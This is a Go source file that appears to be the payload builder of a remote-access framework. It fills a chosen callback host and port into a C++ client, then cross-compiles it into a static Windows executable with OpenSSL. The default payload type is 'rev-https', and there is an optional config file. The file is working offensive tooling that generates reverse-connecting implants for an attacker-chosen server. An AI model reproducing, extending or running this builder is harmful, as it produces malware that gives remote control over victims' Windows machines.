package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

func runCommand(command string, args ...string) {
	cmd := exec.Command(command, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		fmt.Println("\033[1m\033[31m[-] Error:\033[0m", err)
		return
	}
	fmt.Println("\033[1m\033[32m[+] Command executed successfully:\033[0m", command, args)
}

func editPlaceholder(path string, placeholder string, value string) {
	input, err := os.ReadFile(path)
	if err != nil {
		fmt.Println("\u001B[1m\u001B[31m[-] Error while reading file:\u001B[0m", err)
		return
	}

	updatedContent := strings.ReplaceAll(string(input), placeholder, value)

	err = os.WriteFile(path, []byte(updatedContent), os.ModePerm)
	if err != nil {
		fmt.Println("\u001B[1m\u001B[31m[-] Error while writing file:\u001B[0m", err)
		return
	}

	fmt.Println("\u001B[1m\u001B[32m[+] Successfully replaced placeholder\u001B[0m", placeholder, "\u001B[1m\u001B[32mby\u001B[0m", value, "\u001B[1m\u001B[32mat:\u001B[0m", path)
}

func copyDir(src string, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, info.Mode())
		}

		srcFile, err := os.Open(path)
		if err != nil {
			return err
		}
		defer srcFile.Close()

		dstFile, err := os.Create(targetPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		return err
	})
}

func main() {
	payloadType := flag.String("t", "rev-https", "Payload type")
	remoteHost := flag.String("H", "localhost", "Remote host")
	remotePort := flag.Int("p", 443, "Remote port")
	optFN := flag.String("o", "client.exe", "Output file name")
	format := flag.String("f", "exe", "Output file format")
	isConfFile := flag.Bool("c", false, "Enable config file")

	flag.Parse()

	fmt.Println("\033[1m\033[34m[>] Payload type:\033[0m", *payloadType)
	fmt.Println("\033[1m\033[34m[>] Remote Host:\033[0m", *remoteHost)
	fmt.Println("\033[1m\033[34m[>] Remote Port:\033[0m", *remotePort)
	fmt.Println("\033[1m\033[34m[>] Output File Name:\033[0m", *optFN)
	fmt.Println("\033[1m\033[34m[>] Output File Format:\033[0m", *format)
	fmt.Println("\033[1m\033[34m[>] Is Conf. File Used:\033[0m", *isConfFile)

	err := os.MkdirAll("./temp/client", os.ModePerm)
	if err != nil {
		fmt.Println("\033[1m\033[31m[-] Failed to create directory:\033[0m", err)
		return
	}

	source := "../client"
	destination := "./temp/client"

	fmt.Println("\033[1m\033[33m[$] Copying directory from\033[0m", source, "\033[1m\033[33mto\033[0m", destination)

	err = copyDir(source, destination)
	if err != nil {
		fmt.Println("\033[1m\033[31m[-] Error while copying directory:\033[0m", err)
		return
	}

	fmt.Println("\033[1m\033[32m[+] Directory successfully copied to\033[0m", destination)

	editPlaceholder("./temp/client/client.cpp", "{HOST_PLACEHOLDER}", *remoteHost)
	editPlaceholder("./temp/client/client.cpp", "{PORT_PLACEHOLDER}", strconv.Itoa(*remotePort))

	fmt.Println("\033[1m\033[33m[$] Compiling payload\033[0m")

	runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libcrypto.def", "-l", "./temp/client/lib/MT/libcrypto.a", "-k")
	runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libssl.def", "-l", "./temp/client/lib/MT/libssl.a", "-k")

	runCommand("x86_64-w64-mingw32-g++", "-o", *optFN,
		"./temp/client/client.cpp",
		"./temp/client/src/Exec.cpp",
		"./temp/client/src/Serialization.cpp",
		"-I./temp/client/include",
		"-I/usr/x86_64-w64-mingw32/include",
		"-L./temp/client/lib/MT",
		"-L/usr/x86_64-w64-mingw32/lib",
		"-lcrypto", "-lssl", "-lws2_32", "-lcrypt32",
		"-DJSON_DIAGNOSTICS=1", "-static", "-static-libgcc", "-static-libstdc++",
		"-Wl,-subsystem,console", "-Wl,-entry,mainCRTStartup")

	if *isConfFile {

		confFileName := strings.TrimSuffix(*optFN, filepath.Ext(*optFN)) + ".hba"

		confData := map[string]interface{}{
			"port":        *remotePort,
			"payloadType": *payloadType,
		}

		file, err := os.Create(confFileName)
		if err != nil {
			fmt.Println("\033[1m\033[31m[-] Error creating configuration file:\033[0m", err)
			return
		}
		defer file.Close()

		encoder := json.NewEncoder(file)
		encoder.SetIndent("", "  ")
		err = encoder.Encode(confData)
		if err != nil {
			fmt.Println("\033[1m\033[31m[-] Error writing to configuration file:\033[0m", err)
			return
		}

		fmt.Println("\033[1m\033[32m[+] Configuration file created successfully in:\033[0m", confFileName)
	}

	fmt.Println("\033[1m\033[32m[+] Payload successfully compiled\033[0m")
}
